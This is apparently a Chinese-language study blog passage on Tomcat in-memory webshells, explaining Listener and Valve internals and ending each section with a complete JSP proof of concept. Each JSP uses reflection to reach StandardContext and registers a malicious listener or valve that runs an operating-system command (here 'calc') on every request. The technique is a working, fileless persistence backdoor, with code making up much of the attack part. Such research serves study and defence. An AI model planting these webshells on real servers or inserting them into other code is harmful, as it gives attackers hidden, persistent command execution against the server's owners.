<font style="color:rgb(80, 80, 92);">根据名字来看，ServletRequestListenner是最适合当作内存马的。从名字就知道，ServletRequestListener是用来监听ServletRequest对象的，当我们访问任意资源时，即可触发</font>`<font style="color:rgb(83, 83, 96);background-color:rgb(242, 242, 242);">ServletRequestListener#requestInitialized()</font>`<font style="color:rgb(83, 83, 96);background-color:rgb(242, 242, 242);">方法</font>

<h3 id="CR1KX">构建listener</h3>
之前构建Filter内存马，需要定义一个实现好filter接口的类，Listener也是一样，需要定义一个实现好Listener接口的类

要实现listener的业务，就要实现`<font style="color:rgb(83, 83, 96);background-color:rgb(242, 242, 242);">EventListener</font>`

```jsx
package java.util;

/**
 * A tagging interface that all event listener interfaces must extend.
 * @since JDK1.1
 */
public interface EventListener {
}
```

`EventListener`的实现类非常多，我们优先找Servlet开头的，方便去触发我们所构造的恶意Lisenter

![](https://cdn.nlark.com/yuque/0/2025/png/44744277/1740051632668-b59d7e1d-f50c-4baf-abd5-0bad4306cd3a.png)

我们找到了`ServletRequestListener`

感觉该监听器在我们每次发送请求时，都会触发其`requestInitialized`方法

```jsx
public interface ServletRequestListener extends EventListener {

    default public void requestDestroyed(ServletRequestEvent sre) {}

    default public void requestInitialized(ServletRequestEvent sre) {}
}
```

先构造一个简单的listener

<font style="color:rgb(80, 80, 92);">因为前面猜想 </font>`requestInitialized()`<font style="color:rgb(80, 80, 92);"> 方法可以触发 Listener 监控器，所以我们在 </font>`requestInitialized()`<font style="color:rgb(80, 80, 92);"> 方法里面加上一些代码，来证明它何时被执行。</font>

```jsx
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebListener;

@WebListener("/listenerTest")
public class ListenerTest implements ServletRequestListener {

    public ListenerTest(){
    }

    @Override
    public void requestDestroyed(ServletRequestEvent sre) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        System.out.println("Listener Initialized");
    }
}
```

同样我们也需要在web.xml中配置

```jsx
    <listener>
        <listener-class>ListenerTest</listener-class>
    </listener>
```

接下来在访问路径时，都会打印信息

![](https://cdn.nlark.com/yuque/0/2025/png/44744277/1740052668225-37ead02c-f9ad-414a-b125-49cd8446d991.png)

<font style="color:rgb(80, 80, 92);">至此，Listener 基础代码实现完成，下面我们来分析 Listener 的运行流程。</font>

<h2 id="chM1X"><font style="color:rgb(80, 80, 92);">分析</font></h2>
<h3 id="G3Dyy">访问前</h3>
与servlet注册时相似，我们直接看到解析xml文件后做注册的地方`ContextConfig#configureContext`

将web.xml读取后，作为参数传入该方法中后，对servlet、filter、listener等组件进行配置

调试`ContextConfig#configureContext`，我们可以看到，获取的web.xml中已经有了对应的Listener文件

![](https://cdn.nlark.com/yuque/0/2025/png/44744277/1740053961879-7b95aad3-3465-4485-8eb6-084f293f0839.png)

我们在这里重点关注listener的读取

```jsx
private void configureContext(WebXml webxml) {
        ......
        for (String listener : webxml.getListeners()) {
            context.addApplicationListener(listener);
        }
        ......
    }
```

我们在此处下个断点，运行到这里

这里的context是`StandardContext`，执行的是`StandardContext`的`addApplicationListener`方法

![](https://cdn.nlark.com/yuque/0/2025/png/44744277/1740053700525-8b867fe1-c4d0-4aca-b895-92052e1a64aa.png)

**在读取完web.xml文件后，需要去加载Listener**

<font style="color:rgb(80, 80, 92);">当我们读取完配置文件，当应用启动的时候，</font>`StandardContext`<font style="color:rgb(80, 80, 92);"> 会去调用 </font>`listenerStart()`<font style="color:rgb(80, 80, 92);"> 方法。这个方法做了一些基础的安全检查，最后完成简单的 start 业务。</font>

![](https://cdn.nlark.com/yuque/0/2025/png/44744277/1740054961265-c2caae24-9a9c-4af6-88e5-201e596da917.png)

<font style="color:rgb(80, 80, 92);">刚开始的地方，</font>`listenerStart()`<font style="color:rgb(80, 80, 92);"> 方法中有这么一个语句</font>

```jsx
String listeners[] = findApplicationListeners();
```

<font style="color:rgb(80, 80, 92);">这里这个方法实际就是把之前的 Listener 返回，存放到listeners</font>

```jsx
@Override
    public String[] findApplicationListeners() {
        return applicationListeners;
    }
```

<h3 id="rIKmD">访问后</h3>
把断点下在`requestInitialized`方法，开启调试，访问路径后走到这里

![](https://cdn.nlark.com/yuque/0/2025/png/44744277/1740055305524-71187a36-c398-4d73-a0ae-23cdbcf0fbff.png)

但这里只是我们所写的代码执行点，我们需要向上找，找到`StandardContext#fireRequestInitEvent`方法

这里会调用`getApplicationEventListeners`方法，获取`ApplicationEventListeners`并存入`instances[]`中

```jsx
 @Override
    public boolean fireRequestInitEvent(ServletRequest request) {

        Object instances[] = getApplicationEventListeners();

        if ((instances != null) && (instances.length > 0)) {

            ServletRequestEvent event =
                    new ServletRequestEvent(getServletContext(), request);

            for (Object instance : instances) {
                if (instance == null) {
                    continue;
                }
                if (!(instance instanceof ServletRequestListener)) {
                    continue;
                }
                ServletRequestListener listener = (ServletRequestListener) instance;

                try {
                    listener.requestInitialized(event);
                } catch (Throwable t) {
                    ExceptionUtils.handleThrowable(t);
                    getLogger().error(sm.getString(
                            "standardContext.requestListener.requestInit",
                            instance.getClass().getName()), t);
                    request.setAttribute(RequestDispatcher.ERROR_EXCEPTION, t);
                    return false;
                }
            }
        }
        return true;
    }
```

我们进入到`getApplicationEventListeners()`方法中，可以看到该方法只做了一件事：<font style="color:rgb(80, 80, 92);">获取一个 Listener 数组</font>

```jsx
@Override
    public Object[] getApplicationEventListeners() {
        return applicationEventListenersList.toArray();
    }
```

后面的for循环，会从<font style="color:rgb(80, 80, 92);">Listener数组中，将listener一个一个取出来，去执行它的</font>`<font style="color:rgb(80, 80, 92);">requestInitialized</font>`<font style="color:rgb(80, 80, 92);">方法</font>

```jsx
for (Object instance : instances) {
                if (instance == null) {
                    continue;
                }
                if (!(instance instanceof ServletRequestListener)) {
                    continue;
                }
                ServletRequestListener listener = (ServletRequestListener) instance;

                try {
                    listener.requestInitialized(event);
                } catch (Throwable t) {
                    ExceptionUtils.handleThrowable(t);
                    getLogger().error(sm.getString(
                            "standardContext.requestListener.requestInit",
                            instance.getClass().getName()), t);
                    request.setAttribute(RequestDispatcher.ERROR_EXCEPTION, t);
                    return false;
                }
            }
```

我们现在就要想，向这个数组中去添加我们的恶意listener

<font style="color:rgb(80, 80, 92);">我们可以通过 </font>`StandardContext#addApplicationEventListener()`<font style="color:rgb(80, 80, 92);"> 方法来添加 Listener</font>

```jsx
public void addApplicationEventListener(Object listener) {
        applicationEventListenersList.add(listener);
}
```

> <font style="color:rgb(80, 80, 92);background-color:rgb(247, 247, 247);">到这一步的调试就没有内容了，所以这里的逻辑有应该是和 Filter 差不多的，Listener 这里有一个 Listener 数组，对应的 Filter 里面也有一个 Filter 数组。</font>
>

<h2 id="GXNsR">实现</h2>
要实现内存马的注入，有以下两步

+ 在Listener中的`requestInitialized()`<font style="color:rgb(80, 80, 92);"> 方法里面写入恶意代码</font>
+ <font style="color:rgb(80, 80, 92);">通过 StandardContext 类的 </font>`addApplicationEventListener()`<font style="color:rgb(80, 80, 92);"> 方法把恶意的 Listener 放进去</font>

<font style="color:rgb(80, 80, 92);">首先和前两个内存马一样，通过反射来获取</font>`<font style="color:rgb(80, 80, 92);">StandardContext</font>`

```java
ServletContext servletContext =  request.getServletContext();  
    Field applicationContextField = servletContext.getClass().getDeclaredField("context");  
    applicationContextField.setAccessible(true);  
    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);  
  
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");  
    standardContextField.setAccessible(true);  
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);  
```

接下来定义我们的恶意Listener

```java
<%!
    public class Shell_Listener implements ServletRequestListener {
 
        public void requestInitialized(ServletRequestEvent sre) {
            Runtime.getRuntime().exec("calc");
        }
 
        public void requestDestroyed(ServletRequestEvent sre) {
        }
    }
%>
```

最后就要实例化内存马，并<font style="color:rgb(80, 80, 92);">添加监听器</font>

```java
<%
	Shell_Listener shell_Listener = new Shell_Listener();
    context.addApplicationEventListener(shell_Listener);
%>
```

最终poc

```java
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.List" %>
<%@ page import="java.util.Arrays" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.io.IOException" %>
<html>
<head>
    <title>Title</title>
</head>
<body>

<%!
  public class Shell_Listener implements ServletRequestListener {

    public void requestInitialized(ServletRequestEvent sre) {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public void requestDestroyed(ServletRequestEvent sre) {
    }
  }
%>

<%
  ServletContext servletContext =  request.getServletContext();
  Field applicationContextField = servletContext.getClass().getDeclaredField("context");
  applicationContextField.setAccessible(true);
  ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);

  Field standardContextField = applicationContext.getClass().getDeclaredField("context");
  standardContextField.setAccessible(true);
  StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

  Shell_Listener shellListener = new Shell_Listener();
  standardContext.addApplicationEventListener(shellListener);
%>

</body>
</html>

```

将tomcat服务启动后，访问`addListener.jsp`，将恶意filter注册进tomcat，后续访问任何一个路径，都可以成功执行命令

![](https://cdn.nlark.com/yuque/0/2025/png/44744277/1740060142864-8339537b-35c4-4468-b6d8-7254f475520a.png)



<h1 id="JBOpy">Valve内存马</h1>
<h2 id="pNWVG">前置基础</h2>
**tomcat的内部结构**

<font style="color:rgb(80, 80, 92);">tomcat由Connector和Container两部分组成</font>

+ <font style="color:rgb(80, 80, 92);">Connector主要负责对外的网络交互，当收到网络请求时，它将请求包包装为Request，再将Request交给Container进行处理，最终返回给请求方</font>
+ <font style="color:rgb(80, 80, 92);">tomcat中的Container有四种，分别为</font><font style="color:rgb(77, 77, 77);">engine,host,context,wrapper，实现类分别是StandardEngine,StandardHost,StandardContext,StandardWrapper，四个容器间是包含关系</font>

我觉得下面这幅图很好的展示了tomcat的结构![](https://cdn.nlark.com/yuque/0/2025/png/44744277/1740104568341-18b63c8e-c408-4868-af93-667315e0ac45.png)

<font style="color:rgb(80, 80, 92);">我们要学习 Valve 型内存马，就必须要先了解一下 Valve 是什么</font>

> <font style="color:rgb(80, 80, 92);">在了解 Valve 之前，我们先来简单了解一下 Tomcat 中的</font>**管道机制**<font style="color:rgb(80, 80, 92);">。</font>
>
> <font style="color:rgb(80, 80, 92);">我们知道，当 Tomcat 接收到客户端请求时，首先会使用</font><font style="color:rgb(80, 80, 92);"> </font>`Connector`<font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">进行解析，然后发送到</font><font style="color:rgb(80, 80, 92);"> </font>`Container`<font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">进行处理。那么我们的消息又是怎么在四类子容器中层层传递，最终送到 Servlet 进行处理的呢？这里涉及到的机制就是 Tomcat 管道机制。</font>
>
> <font style="color:rgb(80, 80, 92);">管道机制主要涉及到两个名词，Pipeline（管道）和 Valve（阀门）。如果我们把请求比作管道（Pipeline）中流动的水，那么阀门（Valve）就可以用来在管道中实现各种功能，如控制流速等。</font>
>
> <font style="color:rgb(80, 80, 92);">因此通过管道机制，我们能按照需求，给在不同子容器中流通的请求添加各种不同的业务逻辑，并提前在不同子容器中完成相应的逻辑操作。个人理解就是管道与阀门的这种模式，我们可以通过调整阀门，来实现不同的业务。</font>
>

<font style="color:rgb(80, 80, 92);">再Catalina中，有着四种Container，每个容器都有自己的Pipeline（管道）组件，每个Pipeline组件至少会存在一个Valve（阀门），这个Valve我们称之为BaseValve（基础阀）</font>

**<font style="color:rgb(80, 80, 92);">Pipeline 提供了 </font>**`**addValve**`**<font style="color:rgb(80, 80, 92);"> 方法，可以添加新 Valve 在 basic 之前，并按照添加顺序执行</font>**

<font style="color:rgb(80, 80, 92);">当Connector将Request交给Container处理后，Container第一层就是Engine容器，但在tomcat中Engine容器不会直接调用它下一层Host容器去处理相关请求，而是通过Pipeline组件去处理，</font><font style="color:rgb(77, 77, 77);">跟pipeline相关的还有个也是容器内部的组件，叫做valve组件</font>

<font style="color:rgb(80, 80, 92);">下面是 Pipeline 发挥功能的原理图</font>

![](https://cdn.nlark.com/yuque/0/2025/png/44744277/1740105276158-12302953-9846-4902-a423-43a661667630.png)

<h2 id="THsul">分析</h2>
这里我们先实现一个基础的Valve

```jsx
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.valves.ValveBase;

import javax.servlet.ServletException;
import java.io.IOException;

public class ValveTest extends ValveBase {
    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        System.out.println("Valve 被成功调用");
    }
}
```

实现好Valve后，我们需要通过`addValve`方法，将Valve添加进Pipeline中，想一下只要将Valve添加进去，就能实现内存马的注入

看一眼`Pipeline`的接口，存在`addValve`方法，我们可以通过这个方法把Valve添加进去

```jsx
package org.apache.catalina;

import java.util.Set;

public interface Pipeline extends Contained {

    public Valve getBasic();

    public void setBasic(Valve valve);

    public void addValve(Valve valve);

    public Valve[] getValves();

    public void removeValve(Valve valve);

    public Valve getFirst();

    public boolean isAsyncSupported();

    public void findNonAsyncValves(Set<String> result);
}

```

找到Pipeline接口的实现类`StandardPipeline`，<font style="color:rgb(80, 80, 92);">，但是我们是无法直接获取到 </font>`StandardPipeline`<font style="color:rgb(80, 80, 92);"> 的，所以这里去找一找 </font>`StandardContext`<font style="color:rgb(80, 80, 92);"> 有没有获取到 </font>`StandardPipeline`<font style="color:rgb(80, 80, 92);"> 的手段</font>

![](https://cdn.nlark.com/yuque/0/2025/png/44744277/1740106822054-092bf012-6bd5-4a30-a828-b209ef97b143.png)

在`StandardContext`中，找到了一个`getPipeline`方法，跟进查看，会返回当前的`Pipeline`

<font style="color:rgb(80, 80, 92);">可以看一下注解，这里写着 return 一个 Pipeline 类型的类，它是用来管理 Valves 的</font>

```jsx
protected final Pipeline pipeline = new StandardPipeline(this);

//Return the Pipeline object that manages the Valves associated with this Container
@Override
    public Pipeline getPipeline() {
        return this.pipeline;
    }
```

所以可以证明这一点

```jsx
StandardContext.getPipeline() = StandardPipeline; // 二者等价
```

<h2 id="alw1S">Valve何处加载</h2>
<font style="color:rgb(80, 80, 92);">有个问题：我们的 Valve 是应该放到 Filter，Listener，还是 Servlet 里面？</font>

应该是在Servlet中被加载的，因为在Servlet内存马的`HTTP11Processor`<font style="color:rgb(80, 80, 92);"> 的加载 HTTP 请求当中，是出现了 Pipeline 的 basic 的</font>

所以我们通过 Servlet 来加载。

<h2 id="FeMug">实现</h2>
<h3 id="gm19w">思路分析</h3>
现在的思路就已经很明确了

1. 编写恶意Valve
2. 反射获取`StandardContext`
3. 调用`getPieline（）`方法获取`StandardPipeline`
4. 通过`addValve`方法将恶意Valve添加入`StandardPipeline`

<h3 id="i4VKS">Valve内存马实现</h3>
我们先编写一个恶意的Valve内存马

```jsx
<%!
  public class shellValve extends ValveBase {
    @Override
  public void invoke(Request request, Response response) throws IOException, ServletException {
    Runtime.getRuntime().exec("calc");
  }
}
%>
```

后续和前几个内存马一样，通过反射来获取`StandardContext`

```java
ServletContext servletContext = request.getSession().getServletContext();
Field appctx = servletContext.getClass().getDeclaredField("context");
appctx.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

Field stdctx = applicationContext.getClass().getDeclaredField("context");
stdctx.setAccessible(true);
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
```

这里从别的师傅那里看到的，更简单方法的获取`StandardContext`，两个都是可以的

```jsx
// 更简单的方法 获取StandardContext  
 Field reqF = request.getClass().getDeclaredField("request");  
 reqF.setAccessible(true);  
 Request req = (Request) reqF.get(request);  
 StandardContext standardContext = (StandardContext) req.getContext();  
```

最后实现内存马的注入

```jsx
<%
  standardContext.getPipeline().addValve(new shellValve());
  out.println("success");
%>
```

**最终poc如下**

```jsx
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.valves.ValveBase" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.io.IOException" %><%--
  Created by IntelliJ IDEA.
  User: Andu1n
  Date: 2025/2/21
  Time: 11:15
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Title</title>
</head>
<body>
<%
  ServletContext servletContext = request.getSession().getServletContext();
  Field appctx = servletContext.getClass().getDeclaredField("context");
  appctx.setAccessible(true);
  ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

  Field stdctx = applicationContext.getClass().getDeclaredField("context");
  stdctx.setAccessible(true);
  StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

%>

<%!
  public class shellValve extends ValveBase {
    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
      Runtime.getRuntime().exec("calc");
    }
  }
%>

<%
  standardContext.getPipeline().addValve(new shellValve());
  out.println("success");
%>

</body>
</html>

```

启动tomcat服务后，访问我们上传的`addValve.jsp`后，Vlave内存马就被成功注入，后续访问任意路径，都会触发我们的Valve内存马

![](https://cdn.nlark.com/yuque/0/2025/png/44744277/1740108765334-e82c69bb-b0be-466e-8eb7-a2f1fc84acae.png)

